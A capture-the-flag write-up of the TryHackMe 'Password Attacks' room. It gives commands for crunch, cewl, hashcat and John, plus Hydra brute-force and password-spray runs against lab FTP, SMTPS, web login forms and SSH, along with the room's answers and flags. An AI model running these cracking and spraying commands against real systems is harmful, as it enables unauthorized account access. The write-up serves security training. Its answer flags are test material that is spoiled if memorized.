![Password Attacks Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Cover.png" alt="Password Attacks Logo">
</p>

# Password Attacks

This guide contains the answer and steps necessary to get to them for the [Password Attacks](https://tryhackme.com/room/passwordattacks) room.

## Table of contents

- [Password Attacking Techniques](#password-attacking-techniques)
- [Password Profiling #1 - Default, Weak, Leaked, Combined, and Username Wordlists](#password-profiling-1---default-weak-leaked-combined-and-username-wordlists)
- [Password Profiling #2 - Keyspace Technique and CUPP](#password-profiling-2---keyspace-technique-and-cupp)
- [Offline Attacks - Dictionary and Brute-Force](#offline-attacks---dictionary-and-brute-force)
- [Offline Attacks - Rule-Based](#offline-attacks---rule-based)
- [Online password attacks](#online-password-attacks)
- [Password spray attack ](#password-spray-attack)

### Password Attacking Techniques

1. Which type of password attack is performed locally?

   Password cracking is done after the password hash has been extracted to get the password itself. Password guessing is usually done online towards a service.

   ><details><summary>Click for answer</summary>Password Cracking</details>

### Password Profiling #1 - Default, Weak, Leaked, Combined, and Username Wordlists

1. What is the Juniper Networks ISG 2000 default password? 

   For this we can use one of the default passwords website provided. In this case I used `https://default-password.info`.
   
   ![Juniper](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Profiling1_Juniper.png)

   ><details><summary>Click for answer</summary>netscreen:netscreen</details>

### Password Profiling #2 - Keyspace Technique and CUPP

1.  Run the following crunch command: `crunch 2 2 01234abcd -o crunch.txt`. How many words did crunch generate?

    After runnning the command we can see in the output how many lines are written to the file.
    
    ```cmd
    crunch 2 2 01234abcd -o crunch.txt
    ```
    
    ![Crunch Lines](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Profiling2_Crunch_Lines.png)

   ><details><summary>Click for answer</summary>81</details>

2. What is the crunch command to generate a list containing THM@! and output to a file named tryhackme.txt?

   Lets break this down:
   
   - We need 5 characters
   - Special options using -t
   - Output to a file

   The argument for special characters is `^`.

   ><details><summary>Click for answer</summary>crunch 5 5 -t THM^^ -o tryhackme.txt</details>

### Offline Attacks - Dictionary and Brute-Force

1. Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type?

   We can use `hash-identifier` to find out what hash type this is.
   
   ![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Offline_Hash.png)

   ><details><summary>Click for answer</summary>SHA-1</details>

2. Perform a dictionary attack against the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the cracked value? Use rockyou.txt wordlist.

   Lets first find out what the type of this hash is with `hash-identifier`.
   
   ![Hash 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Offline_Hash_2.png)
   
   Now we can look at the hashcat examples page what the correct argument for SHA-1 is.
   
   ![Hash Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Offline_Hash_Type.png)
   
   Putting this together gives us the following command:
   
   ```cmd
   hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt 
   ```
   
   ![Dictionary Attack](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Offline_Dictionary_Attack.png)

   ><details><summary>Click for answer</summary>sunshine</details>

3. Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9]

   For this we need to use the `-a` argument and the correct chartset from the help page.
   
   ```cmd
   hashcat -a 3 m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
   ```
   
   ![Brute Force](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Offline_Brute_Force.png)

   ><details><summary>Click for answer</summary>1337</details>

### Offline Attacks - Rule-Based

1. What syntax would you use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? 

   For this we must use the knowledge we just learned.
   
   - It begins with the special character
   - Then the word
   - Lastly two digits

   ><details><summary>Click for answer</summary>Az"[0-9][0-9]" ^[!@]</details>

### Online password attacks

As mentioned above, lets first create a custom wordlist based on a website using cewl.

```cmd
cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
```

1. Can you guess the FTP credentials without brute-forcing? What is the flag?

   We can try to look for words in our wordlist, but something even easier for ftp is anonymous login. We can see if this is enabled using nmap.
   
   ```cmd
   nmap -sV 10.10.207.111
   nmap -A 10.10.207.111
   ```
   
   ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_Nmap.png)
   
   ![Nmap All](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_Nmap_All.png)
   
   Looks like anonymous login is allowed.
   
   We can now look for the flag.
   
   ![FTP Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_FTP_Flag.png)
   
   ><details><summary>Click for answer</summary>THM{d0abe799f25738ad739c20301aed357b}</details>

2. In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against MACHINE_IP:465 (SMTPS).

   What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].

   ```cmd
   sudo vi /etc/john/john.conf
   ```
   
   ```cmd
   [List.Rules:THM-Password-Attacks]
   Az"[0-9][0-9]" ^[!@]
   ```
   
   ![John Config](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_John_Config.png)
   
   ```cmd
   john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > wordlist.txt
   ```
   
   Now we can use Hydra to attack the smtps service with the wordlist created with John.
   
   ```cmd
   hydra -l pittman@clinic.thmredteam.com -P wordlist2.txt smtps://10.10.155.132 -Vv
   ```

   ![SMTP Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_SMTP_Password.png)

   ><details><summary>Click for answer</summary>!multidisciplinary00</details>

3. Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag?

   For this we will use the same word list, but a different username and attack method. We first need to find out what the format of the request is.
   
   ![HTTP Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_HTTP_Form.png)
   
   Here we see the format and the error message we get when attempting to login using wrong credentials.
   
   For Hydra we will then use the following command:
   
   ```cmd
   hydra -l phillips -P wordlist2.txt 10.10.155.132 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:F=failed"
   ```

   Unfortunately, it never seemed to take to failed condition. Using a success condition somehow did work.
   
   ```cmd
   S=logout.php
   ```
   
   ![HTTP Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_HTTP_Password.png)
   
   Now we can login with these credentials and find the flag.
   
   ![HTTP Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_HTTP_Flag.png)

   ><details><summary>Click for answer</summary>THM{33c5d4954da881814420f3ba39772644}</details>

4. Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/. What is the flag?

   Note: use the clinic.lst dictionary in generating and expanding the wordlist!

   First thing we need to do is expand the previously created clinic.lst using johns single-extra rule.
   
   ```cmd
   john --wordlist=clinic.lst --rules=Single-Extra --stdout > wordlist-http.txt
   ```
   
   We should also check the form page and get the failed login attempt message.
   
   ![HTTP Post Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Form.png)
   
   Note: Unfortunately, this again wouldn't work with the F argument. So I opted to use the S argument instead.
      
   Now we can use hydra to attack the post form.
   
   ```cmd
   hydra -l burgess -P wordlist-http.txt 10.10.155.132 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php"
   ```
   
   ![HTTP Post Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Password.png)
   
   Now we only have to log into the page and get the flag.
   
   ![HTTP Post Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Flag.png)

   ><details><summary>Click for answer</summary>THM{f8e3750cc0ccbb863f2706a3b2933227}</details>

### Password spray attack 

1. Perform a password spraying attack to get access to the SSH://10.10.155.132 server to read /etc/flag. What is the flag?

   We first create the following username list with nano.
   
   ```cmd
   nano usernames-list.txt   
   
   admin
   phillips
   burgess
   pittman
   guess
   ```
   
   Now we must create a password list as well. Using the hint, we can narrow down the list and rules to make. Lets start with a text files containing the following:
   
   ```cmd
   Spring202
   Fall202
   Summer202
   Winter202
   ```
   
   Now we add the following rule to John:
   
   ```cmd
   [List.Rules:THM-Password-Spray]
   Az"[0-1][!@]"
   ```
   
   ![Spray Config](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_Spray_Config.png)
   
   Now we can use these 2 lists in hydra to crack the SSH password.
   
   ```cmd
   hydra -L usernames-list.txt -P wordlist-spray.txt ssh://10.10.155.132 -T 4     
   ```
   
   ![Spray Hydra](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_Spray_Hydra.png)
   
   Use these to login to SSH.
   
   ![Spray SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_Spray_SSH_Login.png)
   
   Nothing was found in the user folder, so I looked at the history which might give us a hint to the flags location. Lo and behold it did! Otherwise, I would have made a search query for the file using:
   
   ```cmd
   find / -name flag 2>/dev/null
   ```
   
   ![Spray Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/passwordattacks/Password_Attacks_Online_Spray_Flag.png)

   ><details><summary>Click for answer</summary>THM{a97a26e86d09388bbea148f4b870277d}</details>
